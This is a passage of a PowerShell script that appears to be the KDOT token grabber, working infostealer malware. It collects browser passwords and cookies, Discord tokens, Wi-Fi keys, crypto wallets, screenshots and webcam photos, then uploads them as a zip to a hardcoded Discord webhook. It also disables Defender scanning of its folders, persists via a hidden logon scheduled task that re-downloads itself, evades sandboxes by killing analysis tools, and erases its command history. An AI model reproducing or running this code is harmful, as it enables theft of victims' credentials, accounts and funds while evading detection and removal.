    Move-Item -Path "$extracted\ip.txt" -Destination "$extracted\KDOT\ip.txt" 
    Move-Item -Path "$extracted\netstat.txt" -Destination "$extracted\KDOT\netstat.txt" 
    Move-Item -Path "$extracted\system_info.txt" -Destination "$extracted\KDOT\system_info.txt" 
    Move-Item -Path "$extracted\uuid.txt" -Destination "$extracted\KDOT\uuid.txt" 
    Move-Item -Path "$extracted\mac.txt" -Destination "$extracted\KDOT\mac.txt" 
    New-Item -Path "$env:localappdata\Temp\KDOT" -Name "Browser Data" -ItemType Directory -force | out-null
    Move-Item -Path "$extracted\browser-cookies.txt" -Destination "$extracted\KDOT\Browser Data" 
    Move-Item -Path "$extracted\browser-history.txt" -Destination "$extracted\KDOT\Browser Data" 
    Move-Item -Path "$extracted\browser-passwords.txt" -Destination "$extracted\KDOT\Browser Data" 
    Move-Item -Path "$extracted\desktop-screenshot.png" -Destination "$extracted\KDOT\desktop-screenshot.png" 
    Move-Item -Path "$extracted\tokens.txt" -Destination "$extracted\KDOT\tokens.txt" 
    Move-Item -Path "$extracted\WIFIPasswords.txt" -Destination "$extracted\KDOT\WIFIPasswords.txt" 
    Move-Item -Path "$extracted\GPU.txt" -Destination "$extracted\KDOT\GPU.txt" 
    Move-Item -Path "$extracted\Installed-Applications.txt" -Destination "$extracted\KDOT\Installed-Applications.txt" 
    Move-Item -Path "$extracted\DiskInfo.txt" -Destination "$extracted\KDOT\DiskInfo.txt" 
    Move-Item -Path "$extracted\CPU.txt" -Destination "$extracted\KDOT\CPU.txt" 
    Move-Item -Path "$extracted\NetworkAdapters.txt" -Destination "$extracted\KDOT\NetworkAdapters.txt" 
    Move-Item -Path "$extracted\ProductKey.txt" -Destination "$extracted\KDOT\ProductKey.txt" 
    Move-Item -Path "$extracted\StartUpApps.txt" -Destination "$extracted\KDOT\StartUpApps.txt" 
    Move-Item -Path "$extracted\running-services.txt" -Destination "$extracted\KDOT\running-services.txt" 
    Move-Item -Path "$extracted\running-applications.txt" -Destination "$extracted\KDOT\running-applications.txt" 
    Move-Item -Path "$messaging_sessions" -Destination "$extracted\KDOT" 
    Move-Item -Path "$gaming_sessions" -Destination "$extracted\KDOT"
    Move-Item -Path "$filegrabber" -Destination "$extracted\KDOT" 
    Move-Item -Path "$crypto" -Destination "$extracted\KDOT" 
    Move-Item -Path "$emailclientsfolder" -Destination "$extracted\KDOT" 
	Move-Item -Path "$vpn_clients" -Destination "$extracted\KDOT" 
    
    # Don't send null data
    Get-ChildItem -Path "$extracted\KDOT" -File | ForEach-Object {
        $_.Attributes = $_.Attributes -band (-bnot [System.IO.FileAttributes]::ReadOnly)
    }
    
    # Remove empty files
    Get-ChildItem -Path "$extracted\KDOT" -File | Where-Object {
        $_.Length -eq 0
    } | Remove-Item -Force
    
    # Remove empty folders
    $Empty = Get-ChildItem "$extracted\KDOT" -Directory -Recurse |
    Where-Object {(Get-ChildItem $_.FullName -File -Recurse -Force).Count -eq 0}
    Foreach ($Dir in $Empty)
    {
        if (test-path $Dir.FullName)
        {Remove-Item -LiteralPath $Dir.FullName -recurse -force}
    }
    
    Compress-Archive -Path "$extracted\KDOT" -DestinationPath "$extracted\KDOT.zip" -Force
    curl.exe -X POST -F 'payload_json={\"username\": \"KDOT\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/k58gQ03t/PTG.gif\"}' -F "file=@$extracted\KDOT.zip" $webhook
    Remove-Item "$extracted\KDOT.zip" -Force
    Remove-Item "$extracted\KDOT" -Recurse -Force
    Remove-Item "$filegrabber" -recurse -force
    Remove-Item "$crypto" -recurse -force
    Remove-Item "$messaging_sessions" -recurse -force
    Remove-Item "$gaming_sessions" -recurse -force
    Remove-Item "$emailclientsfolder" -recurse -force
	Remove-Item "$vpn_clients" -recurse -force
    Remove-Item "$extracted\main.exe" -Force
}

function Get-WebCamImage {
    # made by https://github.com/stefanstranger/PowerShell/blob/master/Get-WebCamp.ps1, he did 99% of the work the other 1% modified by KDot227
    # had to half learn c# to figure anything out (I still don't understand it)
    $source=@" 
    using System; 
    using System.Collections.Generic; 
    using System.Text; 
    using System.Collections; 
    using System.Runtime.InteropServices; 
    using System.ComponentModel; 
    using System.Data; 
    using System.Drawing; 
    using System.Windows.Forms; 
    
    namespace WebCamLib 
    { 
        public class Device 
        { 
            private const short WM_CAP = 0x400; 
            private const int WM_CAP_DRIVER_CONNECT = 0x40a; 
            private const int WM_CAP_DRIVER_DISCONNECT = 0x40b; 
            private const int WM_CAP_EDIT_COPY = 0x41e; 
            private const int WM_CAP_SET_PREVIEW = 0x432; 
            private const int WM_CAP_SET_OVERLAY = 0x433; 
            private const int WM_CAP_SET_PREVIEWRATE = 0x434; 
            private const int WM_CAP_SET_SCALE = 0x435; 
            private const int WS_CHILD = 0x40000000; 
            private const int WS_VISIBLE = 0x10000000; 
    
            [DllImport("avicap32.dll")] 
            protected static extern int capCreateCaptureWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindowName, 
                int dwStyle, int x, int y, int nWidth, int nHeight, int hWndParent, int nID); 
    
            [DllImport("user32", EntryPoint = "SendMessageA")] 
            protected static extern int SendMessage(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.AsAny)] object lParam); 
    
            [DllImport("user32")] 
            protected static extern int SetWindowPos(int hwnd, int hWndInsertAfter, int x, int y, int cx, int cy, int wFlags); 
    
            [DllImport("user32")] 
            protected static extern bool DestroyWindow(int hwnd); 
                    
            int index; 
            int deviceHandle; 
    
            public Device(int index) 
            { 
                this.index = index; 
            } 
    
            private string _name; 
    
            public string Name 
            { 
                get { return _name; } 
                set { _name = value; } 
            } 
    
            private string _version; 
    
            public string Version 
            { 
                get { return _version; } 
                set { _version = value; } 
            } 
    
            public override string ToString() 
            { 
                return this.Name; 
            } 
    
            public void Init(int windowHeight, int windowWidth, int handle) 
            { 
                string deviceIndex = Convert.ToString(this.index); 
                deviceHandle = capCreateCaptureWindowA(ref deviceIndex, WS_VISIBLE | WS_CHILD, 0, 0, windowWidth, windowHeight, handle, 0); 
    
                if (SendMessage(deviceHandle, WM_CAP_DRIVER_CONNECT, this.index, 0) > 0) 
                { 
                    SendMessage(deviceHandle, WM_CAP_SET_SCALE, -1, 0); 
                    SendMessage(deviceHandle, WM_CAP_SET_PREVIEWRATE, 0x42, 0); 
                    SendMessage(deviceHandle, WM_CAP_SET_PREVIEW, -1, 0); 
                    SetWindowPos(deviceHandle, 1, 0, 0, windowWidth, windowHeight, 6); 
                } 
            } 
    
            public void ShowWindow(global::System.Windows.Forms.Control windowsControl) 
            { 
                Init(windowsControl.Height, windowsControl.Width, windowsControl.Handle.ToInt32());                         
            } 
            
            public void CopyC() 
            { 
                SendMessage(this.deviceHandle, WM_CAP_EDIT_COPY, 0, 0);          
            } 
    
            public void Stop() 
            { 
                SendMessage(deviceHandle, WM_CAP_DRIVER_DISCONNECT, this.index, 0); 
                DestroyWindow(deviceHandle); 
            } 
        } 
        
        public class DeviceManager 
        { 
            [DllImport("avicap32.dll")] 
            protected static extern bool capGetDriverDescriptionA(short wDriverIndex, 
                [MarshalAs(UnmanagedType.VBByRefStr)]ref String lpszName, 
            int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref String lpszVer, int cbVer); 
    
            static ArrayList devices = new ArrayList(); 
    
            public static Device[] GetAllDevices() 
            { 
                String dName = "".PadRight(100); 
                String dVersion = "".PadRight(100); 
    
                for (short i = 0; i < 10; i++) 
                { 
                    if (capGetDriverDescriptionA(i, ref dName, 100, ref dVersion, 100)) 
                    { 
                        Device d = new Device(i); 
                        d.Name = dName.Trim(); 
                        d.Version = dVersion.Trim(); 
                        devices.Add(d);                     
                    } 
                } 
    
                return (Device[])devices.ToArray(typeof(Device)); 
            } 
			
            public static Device GetDevice(int deviceIndex) 
            { 
                return (Device)devices[deviceIndex]; 
            } 
        } 
    } 
"@ 
    Add-Type -AssemblyName System.Drawing  
    $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |   
    Where-Object { $_.FormatDescription -eq "JPEG" }       
    Add-Type -TypeDefinition $source -ReferencedAssemblies System.Windows.Forms, System.Data, System.Drawing  | Out-Null
    try {
        #region Import the Assemblies 
        [reflection.assembly]::loadwithpartialname("System.Windows.Forms") | Out-Null 
        [reflection.assembly]::loadwithpartialname("System.Drawing") | Out-Null 
        #endregion 
        $picCapture = New-Object System.Windows.Forms.PictureBox 
        try {
            $devices = [WebCamLib.DeviceManager]::GetAllDevices()
        } catch {
            Write-Host "No camera found"
            exit
        }
        $count = 0
        foreach ($device in $devices) {
            $imagePath = "$env:localappdata\temp\out$count.jpg"
            $device.ShowWindow($picCapture)
            $device.CopyC()
            $bitmap = [Windows.Forms.Clipboard]::GetImage()
            $bitmap.Save($imagePath, $jpegCodec, $ep)
            $bitmap.dispose()
            $count++
            [Windows.Forms.Clipboard]::Clear()
        }

    } catch {
            Write-Host "No camera found"
            exit
        }
}

$webhook = "https://discord.com/api/webhooks/1116069524161183744/d1OoBxeXYeRoB3i3VDCB8XAFrERmKw1zM52S7lzLLWdQ6yEwHpKEkVwysID14mS4rqy_"

function Invoke-TASKS {
    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
    Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
    New-Item -ItemType Directory -Path "$env:APPDATA\KDOT" -Force
    # Hidden Directory
    $KDOT_DIR=get-item "$env:APPDATA\KDOT" -Force
    $KDOT_DIR.attributes="Hidden","System" 
    #$origin = $PSCommandPath
    #Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1" -Force
    #download new grabber
    (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main.ps1", "$env:APPDATA\KDOT\KDOT.ps1")
    #replace https://discord.com/api/webhooks/1116069524161183744/d1OoBxeXYeRoB3i3VDCB8XAFrERmKw1zM52S7lzLLWdQ6yEwHpKEkVwysID14mS4rqy_ with the webhook
    $inputstuff = Get-Content "$env:APPDATA\KDOT\KDOT.ps1"
    #IM USING [CHAR]89 TO REPLACE THE Y SO THE BUILDER DOESN'T REPLACE IT
    $to_replace = [char]89 + "OUR_WEBHOOK_HERE"
    $inputstuff = $inputstuff -replace "$to_replace", "$webhook"
    $inputstuff | Set-Content "$env:APPDATA\KDOT\KDOT.ps1" -Force
    $task_name = "KDOT"
    $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\kdot\kdot.ps1",0)(window.close)'
    $task_trigger = New-ScheduledTaskTrigger -AtLogOn
    $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
    Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "KDOT" -RunLevel Highest -Force
    EXFILTRATE-DATA
}

function Request-Admin {
    while(!(CHECK_IF_ADMIN)) {
        try {
            Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle hidden -File `"$PSCommandPath`"" -Verb RunAs
            exit
        }
        catch {}
    }
}

function Invoke-ANTITOTAL {
    $urls = @(
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt"
    )
    $functions = @(
        "Search-Mac",
        "Search-IP",
        "Search-HWID",
        "Search-Username"
    )
    
    for ($i = 0; $i -lt $urls.Count; $i++) {
        $url = $urls[$i]
        $functionName = $functions[$i]
        
        $result = Invoke-WebRequest -Uri $url -Method Get
        if ($result.StatusCode -eq 200) {
            $content = $result.Content
            $function = Get-Command -Name $functionName
            $output = & $function.Name $content
            
            if ($output -eq $true) {
                Write-Host "Closing the app..."
                exit
            }
        }
        else {
            Write-Host "Failed to retrieve content from URL: $url"
            exit
        }
    }
    Invoke-ANTIVM
}

function Search-Mac ($mac_addresses) {
    $pc_mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where{$_.IpEnabled -Match "True"} | Select-Object -Expand macaddress) -join ","
    ForEach ($mac123 in $mac_addresses) {
        if ($pc_mac -contains $mac123) {
            return $true
        }
    }
    return $false
}

function Search-IP ($ip_addresses) {
    $pc_ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
    $pc_ip = $pc_ip.Content
    ForEach ($ip123 in $ip_addresses) {
        if ($pc_ip -contains $ip123) {
            return $true
        }
    }
    return $false
}

function Search-HWID ($hwids) {
    $pc_hwid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
    ForEach ($hwid123 in $hwids) {
        if ($pc_hwid -contains $hwid123) {
            return $true
        }
    }
    return $false
}

function Search-Username ($usernames) {
    $pc_username = $env:USERNAME
    ForEach ($username123 in $usernames) {
        if ($pc_username -contains $username123) {
            return $true
        }
    }
    return $false
}

function Invoke-ANTIVM {
    $processnames= @(
            "autoruns",
            "autorunsc",
            "dumpcap",
            "fiddler",
            "fakenet",
            "hookexplorer",
            "immunitydebugger",
            "httpdebugger",
            "importrec",
            "lordpe",
            "petools",
            "processhacker",
            "resourcehacker",
            "scylla_x64",
            "sandman",
            "sysinspector",
            "tcpview",
            "die",
            "dumpcap",
            "filemon",
            "idaq",
            "idaq64",
            "joeboxcontrol",
            "joeboxserver",
            "ollydbg",
            "proc_analyzer",
            "procexp",
            "procmon",
            "pestudio",
            "qemu-ga",
            "qga",
            "regmon",
            "sniff_hit",
            "sysanalyzer",
            "tcpview",
            "windbg",
            "wireshark",
            "x32dbg",
            "x64dbg",
            "vmwareuser",
            "vmacthlp",
            "vboxservice",
            "vboxtray",
            "xenservice"
        )
    $detectedProcesses = $processnames | ForEach-Object {
        $processName = $_
        if (Get-Process -Name $processName) {
            $processName
        }
    }

    if ($null -eq $detectedProcesses) { 
        Invoke-TASKS
    }
    else { 
        Write-Output "Detected processes: $($detectedProcesses -join ', ')"
        Foreach ($process in $detectedProcesses) {
            Stop-Process -Name $process -Force
        }
    }
}

function Hide-Console
{
    if (-not ("Console.Window" -as [type])) { 
        Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
        '
    }
    $consolePtr = [Console.Window]::GetConsoleWindow()
    $null = [Console.Window]::ShowWindow($consolePtr, 0)
}

if (CHECK_IF_ADMIN -eq $true) {
    Hide-Console
    MUTEX-CHECK
    # Self-Destruct
    # Remove-Item $PSCommandPath -Force 
} else {
    Write-Host ("Please run as admin!") -ForegroundColor Red
    Start-Sleep -s 1
    Request-Admin
}

Remove-Item (Get-PSreadlineOption).HistorySavePath

# SIG # Begin signature block
# MIIbkgYJKoZIhvcNAQcCoIIbgzCCG38CAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUuhonctTu6lvYt5QIwT28Ghf7
# 3figghYLMIIDADCCAeigAwIBAgIQNqazWmfkq4JClDn983ZN6TANBgkqhkiG9w0B
# AQsFADAYMRYwFAYDVQQDDA1Hb2RGYXRoZXIgSW5jMB4XDTIzMDUzMTAyNDIxOFoX
# DTMzMDUzMTAyNTIxN1owGDEWMBQGA1UEAwwNR29kRmF0aGVyIEluYzCCASIwDQYJ
# KoZIhvcNAQEBBQADggEPADCCAQoCggEBAKZ9VYgdHwNR7ggC2tnuDhWm8uAw42dG
# FJPNI4nXQnIjFu8DtU8ANmHZsYRqRdTHMstdosEQDX7lRDNxRYZpiqRsgBs8hSeF
# wJf4AhNCaN4/1Hn5TZzAjEK82+Xw2OUwtT+0/BJPD0fvTheKKByrh93Ab5U8H7YB
# BO+Uv6qIOht7r5i7osLvfRR73ntdUYJVF7ON/+RrOMbAfjN0D46akwOjVMk2PlyW
# DoGVL9v223Q9FHlFfs0uyDJBfXuOMGQNlXNLxjTX8JT6/v0tFrOH3lOUaE8ssy6F
# CWvTVmEBkruA1qkZUxCHRow4iayPwqlQ2LuuQL6Tyq2OE+4IugXjng0CAwEAAaNG
# MEQwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQMMAoGCCsGAQUFBwMDMB0GA1UdDgQW
# BBToXylAr/+7oMQ3mw2deDTuDF+ImTANBgkqhkiG9w0BAQsFAAOCAQEAT1mrVdAM
# gX5y3pPDucnLOdaUn2KGEBAJuQWjfFSYHOJHv6q1hvpbAz18YMNYqbFb1hIOgAxs
# jWlJGpJwikPR3p+BN68nFuWmyUsA2oPXC9KjTH0UXvkkKbpsdzcN9EEBmeP7QZto
# OujkqGqxc4RduBBN70RhOhrS4GUDQ+AbwhF7XxqKTwJGynWgkdevlqi7n9PyihYI
# MmzS7sJxz/HMVKdd7fIW5vu3ncH7uME56hbJRnT+Z9UfDG5ApWYE4/+Uj9O22Nnd
# F3qAPUpSSCK2ud+sD1iJUCI9yqJoxQO3vf1Re7jIpsljSyxBQcaqZ4+uSNAuyysj
# rQl02rZbszjyYDCCBY0wggR1oAMCAQICEA6bGI750C3n79tQ4ghAGFowDQYJKoZI
# hvcNAQEMBQAwZTELMAkGA1UEBhMCVVMxFTATBgNVBAoTDERpZ2lDZXJ0IEluYzEZ
# MBcGA1UECxMQd3d3LmRpZ2ljZXJ0LmNvbTEkMCIGA1UEAxMbRGlnaUNlcnQgQXNz
# dXJlZCBJRCBSb290IENBMB4XDTIyMDgwMTAwMDAwMFoXDTMxMTEwOTIzNTk1OVow
# YjELMAkGA1UEBhMCVVMxFTATBgNVBAoTDERpZ2lDZXJ0IEluYzEZMBcGA1UECxMQ
# d3d3LmRpZ2ljZXJ0LmNvbTEhMB8GA1UEAxMYRGlnaUNlcnQgVHJ1c3RlZCBSb290
# IEc0MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAv+aQc2jeu+RdSjww
# IjBpM+zCpyUuySE98orYWcLhKac9WKt2ms2uexuEDcQwH/MbpDgW61bGl20dq7J5
# 8soR0uRf1gU8Ug9SH8aeFaV+vp+pVxZZVXKvaJNwwrK6dZlqczKU0RBEEC7fgvMH
# hOZ0O21x4i0MG+4g1ckgHWMpLc7sXk7Ik/ghYZs06wXGXuxbGrzryc/NrDRAX7F6
# Zu53yEioZldXn1RYjgwrt0+nMNlW7sp7XeOtyU9e5TXnMcvak17cjo+A2raRmECQ
# ecN4x7axxLVqGDgDEI3Y1DekLgV9iPWCPhCRcKtVgkEy19sEcypukQF8IUzUvK4b
# A3VdeGbZOjFEmjNAvwjXWkmkwuapoGfdpCe8oU85tRFYF/ckXEaPZPfBaYh2mHY9
# WV1CdoeJl2l6SPDgohIbZpp0yt5LHucOY67m1O+SkjqePdwA5EUlibaaRBkrfsCU
# tNJhbesz2cXfSwQAzH0clcOP9yGyshG3u3/y1YxwLEFgqrFjGESVGnZifvaAsPvo
# ZKYz0YkH4b235kOkGLimdwHhD5QMIR2yVCkliWzlDlJRR3S+Jqy2QXXeeqxfjT/J
# vNNBERJb5RBQ6zHFynIWIgnffEx1P2PsIV/EIFFrb7GrhotPwtZFX50g/KEexcCP
# orF+CiaZ9eRpL5gdLfXZqbId5RsCAwEAAaOCATowggE2MA8GA1UdEwEB/wQFMAMB
# Af8wHQYDVR0OBBYEFOzX44LScV1kTN8uZz/nupiuHA9PMB8GA1UdIwQYMBaAFEXr
# oq/0ksuCMS1Ri6enIZ3zbcgPMA4GA1UdDwEB/wQEAwIBhjB5BggrBgEFBQcBAQRt
# MGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEF
# BQcwAoY3aHR0cDovL2NhY2VydHMuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl
# ZElEUm9vdENBLmNydDBFBgNVHR8EPjA8MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdp
# Y2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMBEGA1UdIAQKMAgw
# BgYEVR0gADANBgkqhkiG9w0BAQwFAAOCAQEAcKC/Q1xV5zhfoKN0Gz22Ftf3v1cH
# vZqsoYcs7IVeqRq7IviHGmlUIu2kiHdtvRoU9BNKei8ttzjv9P+Aufih9/Jy3iS8
# UgPITtAq3votVs/59PesMHqai7Je1M/RQ0SbQyHrlnKhSLSZy51PpwYDE3cnRNTn
# f+hZqPC/Lwum6fI0POz3A8eHqNJMQBk1RmppVLC4oVaO7KTVPeix3P0c2PR3WlxU
# jG/voVA9/HYJaISfb8rbII01YBwCA8sgsKxYoA5AY8WYIsGyWfVVa88nq2x2zm8j
# LfR+cWojayL/ErhULSd+2DrZ8LaHlv1b0VysGMNNn3O3AamfV6peKOK5lDCCBq4w
# ggSWoAMCAQICEAc2N7ckVHzYR6z9KGYqXlswDQYJKoZIhvcNAQELBQAwYjELMAkG
# A1UEBhMCVVMxFTATBgNVBAoTDERpZ2lDZXJ0IEluYzEZMBcGA1UECxMQd3d3LmRp
# Z2ljZXJ0LmNvbTEhMB8GA1UEAxMYRGlnaUNlcnQgVHJ1c3RlZCBSb290IEc0MB4X
# DTIyMDMyMzAwMDAwMFoXDTM3MDMyMjIzNTk1OVowYzELMAkGA1UEBhMCVVMxFzAV
# BgNVBAoTDkRpZ2lDZXJ0LCBJbmMuMTswOQYDVQQDEzJEaWdpQ2VydCBUcnVzdGVk
# IEc0IFJTQTQwOTYgU0hBMjU2IFRpbWVTdGFtcGluZyBDQTCCAiIwDQYJKoZIhvcN
# AQEBBQADggIPADCCAgoCggIBAMaGNQZJs8E9cklRVcclA8TykTepl1Gh1tKD0Z5M
# om2gsMyD+Vr2EaFEFUJfpIjzaPp985yJC3+dH54PMx9QEwsmc5Zt+FeoAn39Q7SE
# 2hHxc7Gz7iuAhIoiGN/r2j3EF3+rGSs+QtxnjupRPfDWVtTnKC3r07G1decfBmWN
# lCnT2exp39mQh0YAe9tEQYncfGpXevA3eZ9drMvohGS0UvJ2R/dhgxndX7RUCyFo
# bjchu0CsX7LeSn3O9TkSZ+8OpWNs5KbFHc02DVzV5huowWR0QKfAcsW6Th+xtVhN
# ef7Xj3OTrCw54qVI1vCwMROpVymWJy71h6aPTnYVVSZwmCZ/oBpHIEPjQ2OAe3Vu
# JyWQmDo4EbP29p7mO1vsgd4iFNmCKseSv6De4z6ic/rnH1pslPJSlRErWHRAKKtz
# Q87fSqEcazjFKfPKqpZzQmiftkaznTqj1QPgv/CiPMpC3BhIfxQ0z9JMq++bPf4O
# uGQq+nUoJEHtQr8FnGZJUlD0UfM2SU2LINIsVzV5K6jzRWC8I41Y99xh3pP+OcD5
# sjClTNfpmEpYPtMDiP6zj9NeS3YSUZPJjAw7W4oiqMEmCPkUEBIDfV8ju2TjY+Cm
# 4T72wnSyPx4JduyrXUZ14mCjWAkBKAAOhFTuzuldyF4wEr1GnrXTdrnSDmuZDNIz
# tM2xAgMBAAGjggFdMIIBWTASBgNVHRMBAf8ECDAGAQH/AgEAMB0GA1UdDgQWBBS6
# FtltTYUvcyl2mi91jGogj57IbzAfBgNVHSMEGDAWgBTs1+OC0nFdZEzfLmc/57qY
# rhwPTzAOBgNVHQ8BAf8EBAMCAYYwEwYDVR0lBAwwCgYIKwYBBQUHAwgwdwYIKwYB
# BQUHAQEEazBpMCQGCCsGAQUFBzABhhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20w
# QQYIKwYBBQUHMAKGNWh0dHA6Ly9jYWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2Vy
# dFRydXN0ZWRSb290RzQuY3J0MEMGA1UdHwQ8MDowOKA2oDSGMmh0dHA6Ly9jcmwz
# LmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFRydXN0ZWRSb290RzQuY3JsMCAGA1UdIAQZ
# MBcwCAYGZ4EMAQQCMAsGCWCGSAGG/WwHATANBgkqhkiG9w0BAQsFAAOCAgEAfVmO
# wJO2b5ipRCIBfmbW2CFC4bAYLhBNE88wU86/GPvHUF3iSyn7cIoNqilp/GnBzx0H
# 6T5gyNgL5Vxb122H+oQgJTQxZ822EpZvxFBMYh0MCIKoFr2pVs8Vc40BIiXOlWk/
# R3f7cnQU1/+rT4osequFzUNf7WC2qk+RZp4snuCKrOX9jLxkJodskr2dfNBwCnzv
# qLx1T7pa96kQsl3p/yhUifDVinF2ZdrM8HKjI/rAJ4JErpknG6skHibBt94q6/ae
# sXmZgaNWhqsKRcnfxI2g55j7+6adcq/Ex8HBanHZxhOACcS2n82HhyS7T6NJuXdm
# kfFynOlLAlKnN36TU6w7HQhJD5TNOXrd/yVjmScsPT9rp/Fmw0HNT7ZAmyEhQNC3
# EyTN3B14OuSereU0cZLXJmvkOHOrpgFPvT87eK1MrfvElXvtCl8zOYdBeHo46Zzh
# 3SP9HSjTx/no8Zhf+yvYfvJGnXUsHicsJttvFXseGYs2uJPU5vIXmVnKcPA3v5gA
# 3yAWTyf7YGcWoWa63VXAOimGsJigK+2VQbc61RWYMbRiCQ8KvYHZE/6/pNHzV9m8
# BPqC3jLfBInwAM1dwvnQI38AC+R2AibZ8GV2QqYphwlHK+Z/GqSFD/yYlvZVVCsf
# gPrA8g4r5db7qS9EFUrnEw4d2zc4GqEr9u3WfPwwggbAMIIEqKADAgECAhAMTWly
# S5T6PCpKPSkHgD1aMA0GCSqGSIb3DQEBCwUAMGMxCzAJBgNVBAYTAlVTMRcwFQYD
# VQQKEw5EaWdpQ2VydCwgSW5jLjE7MDkGA1UEAxMyRGlnaUNlcnQgVHJ1c3RlZCBH
# NCBSU0E0MDk2IFNIQTI1NiBUaW1lU3RhbXBpbmcgQ0EwHhcNMjIwOTIxMDAwMDAw
# WhcNMzMxMTIxMjM1OTU5WjBGMQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNl
# cnQxJDAiBgNVBAMTG0RpZ2lDZXJ0IFRpbWVzdGFtcCAyMDIyIC0gMjCCAiIwDQYJ
# KoZIhvcNAQEBBQADggIPADCCAgoCggIBAM/spSY6xqnya7uNwQ2a26HoFIV0Mxom
# rNAcVR4eNm28klUMYfSdCXc9FZYIL2tkpP0GgxbXkZI4HDEClvtysZc6Va8z7GGK
# 6aYo25BjXL2JU+A6LYyHQq4mpOS7eHi5ehbhVsbAumRTuyoW51BIu4hpDIjG8b7g
# L307scpTjUCDHufLckkoHkyAHoVW54Xt8mG8qjoHffarbuVm3eJc9S/tjdRNlYRo
# 44DLannR0hCRRinrPibytIzNTLlmyLuqUDgN5YyUXRlav/V7QG5vFqianJVHhoV5
# PgxeZowaCiS+nKrSnLb3T254xCg/oxwPUAY3ugjZNaa1Htp4WB056PhMkRCWfk3h
# 3cKtpX74LRsf7CtGGKMZ9jn39cFPcS6JAxGiS7uYv/pP5Hs27wZE5FX/NurlfDHn
# 88JSxOYWe1p+pSVz28BqmSEtY+VZ9U0vkB8nt9KrFOU4ZodRCGv7U0M50GT6Vs/g
# 9ArmFG1keLuY/ZTDcyHzL8IuINeBrNPxB9ThvdldS24xlCmL5kGkZZTAWOXlLimQ
# prdhZPrZIGwYUWC6poEPCSVT8b876asHDmoHOWIZydaFfxPZjXnPYsXs4Xu5zGcT
# B5rBeO3GiMiwbjJ5xwtZg43G7vUsfHuOy2SJ8bHEuOdTXl9V0n0ZKVkDTvpd6kVz
# HIR+187i1Dp3AgMBAAGjggGLMIIBhzAOBgNVHQ8BAf8EBAMCB4AwDAYDVR0TAQH/
# BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDAgBgNVHSAEGTAXMAgGBmeBDAEE
# AjALBglghkgBhv1sBwEwHwYDVR0jBBgwFoAUuhbZbU2FL3MpdpovdYxqII+eyG8w
# HQYDVR0OBBYEFGKK3tBh/I8xFO2XC809KpQU31KcMFoGA1UdHwRTMFEwT6BNoEuG
# SWh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFRydXN0ZWRHNFJTQTQw
# OTZTSEEyNTZUaW1lU3RhbXBpbmdDQS5jcmwwgZAGCCsGAQUFBwEBBIGDMIGAMCQG
# CCsGAQUFBzABhhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wWAYIKwYBBQUHMAKG
# TGh0dHA6Ly9jYWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFRydXN0ZWRHNFJT
# QTQwOTZTSEEyNTZUaW1lU3RhbXBpbmdDQS5jcnQwDQYJKoZIhvcNAQELBQADggIB
# AFWqKhrzRvN4Vzcw/HXjT9aFI/H8+ZU5myXm93KKmMN31GT8Ffs2wklRLHiIY1UJ
# RjkA/GnUypsp+6M/wMkAmxMdsJiJ3HjyzXyFzVOdr2LiYWajFCpFh0qYQitQ/Bu1
# nggwCfrkLdcJiXn5CeaIzn0buGqim8FTYAnoo7id160fHLjsmEHw9g6A++T/350Q
# p+sAul9Kjxo6UrTqvwlJFTU2WZoPVNKyG39+XgmtdlSKdG3K0gVnK3br/5iyJpU4
# GYhEFOUKWaJr5yI+RCHSPxzAm+18SLLYkgyRTzxmlK9dAlPrnuKe5NMfhgFknADC
